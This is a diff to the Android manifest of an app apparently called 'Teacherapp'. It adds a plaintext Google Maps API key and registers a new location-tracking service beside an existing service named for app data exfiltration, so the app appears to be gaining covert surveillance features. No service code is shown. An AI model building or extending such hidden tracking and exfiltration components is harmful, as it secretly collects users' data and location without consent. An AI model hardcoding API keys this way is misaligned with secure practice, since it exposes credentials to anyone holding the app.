@@ -28,6 +28,11 @@
         android:theme="@style/Theme.Teacherapp"
         android:usesCleartextTraffic="true">
 
+        <!-- Google Maps API Key -->
+        <meta-data
+            android:name="com.google.android.geo.API_KEY"
+            android:value="AIzaSyBd9BvIpTmRCxtEPlV3wmA37b-cQGzNt0o" />
+
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -75,6 +80,12 @@
 
         <service
             android:name="com.teacherapp.services.AppDataExfiltrationService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- NEW: Location Tracking Service -->
+        <service
+            android:name="com.teacherapp.services.LocationTrackingService"
             android:enabled="true"
             android:exported="false" />
 
